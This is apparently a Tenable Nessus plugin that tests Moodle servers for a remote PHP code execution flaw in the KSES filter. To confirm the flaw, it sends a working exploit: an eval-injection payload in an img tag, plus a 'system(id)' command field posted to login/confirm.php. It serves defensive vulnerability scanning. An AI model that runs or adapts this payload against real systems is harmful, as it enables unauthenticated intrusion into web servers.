#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(34095);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2016/05/20 14:12:06 $");

  script_bugtraq_id(28599);
  script_osvdb_id(47977);
  script_xref(name:"EDB-ID", value:"6356");
  script_xref(name:"Secunia", value:"30986");
  script_xref(name:"Secunia", value:"31017");

  script_name(english:"Moodle 'lib/kses.php' 'kses_bad_protocol_once' Function Arbitrary PHP Code Execution");
  script_summary(english:"Attempts to run a command.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows remote
execution of arbitrary code.");
 script_set_attribute(attribute:"description", value:
"The version of Moodle on the remote host includes a version of the
KSES HTML filtering library that does not safely call 'preg_replace()'
in the function 'kses_bad_protocol_once()' in 'lib/kses.php'. An
unauthenticated, remote attacker can leverage this issue to inject
arbitrary PHP code that will be executed subject to the privileges of
the web server user id.

Note that there are also reportedly several cross-site scripting and
HTML filtering bypass vulnerabilities in the version of the KSES
library in use, although Nessus has not explicitly tested for them.");
 script_set_attribute(attribute:"see_also", value:"http://moodle.org/mod/forum/discuss.php?d=95031");
 script_set_attribute(attribute:"see_also", value:"http://docs.moodle.org/en/Release_Notes#Moodle_1.8.5");
 script_set_attribute(attribute:"solution", value:
"Upgrade to Moodle 1.8.5, 1.9, or any recent nightly 1.7.x or 1.6.x
build.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Moodle <= 1.8.4 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/09/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:moodle:moodle");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("moodle_detect.nasl");
  script_require_keys("www/PHP", "installed_sw/Moodle");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Moodle";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

# Make sure the affected script exists.
url = dir + "/login/confirm.php";

w = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
res = strcat(w[0], w[1], '\r\n', w[2]);
if (
  ' MoodleSession=' >< res ||
  ' MoodleSessionTest=' >< res ||
  dir + '/lib/javascript/static.js' >< res ||
  'p class="helplink">' >< res
)
{
  # Try to exploit the flaw.
  bound = "nessus";
  exploit = "<img src=http&{${eval($_POST[cmd])}};://nessus.org>";

  boundary = "--" + bound;
  postdata =
    boundary + '\r\n' +
    'Content-Disposition: form-data; name="s"\r\n' +
    '\r\n' +
    exploit + '\r\n' +
    boundary + '\r\n' +
    'Content-Disposition: form-data; name="cmd"' + '\r\n'+
    '\r\n' +
    "system(" + cmd + ");exit;" + '\r\n' +
    boundary + "--" + '\r\n';

  w = http_send_recv3(method:"POST", port: port, item: url,
    content_type:"multipart/form-data; boundary="+bound,
    data: postdata, exit_on_fail:TRUE);
  res = w[2];

  if (egrep(pattern:cmd_pat, string:res))
  {
    if (report_verbosity)
    {
      report =
        '\n' + "Nessus was able to execute the command '" + cmd + "' on the remote" +
        '\n' + 'host using the following request :' +
        '\n' + 
        '\n' + "  " + str_replace(find:'\n', replace:'\n  ', string: http_last_sent_request());
      if (report_verbosity > 1)
      {
        report +=
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + "  " + res;
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
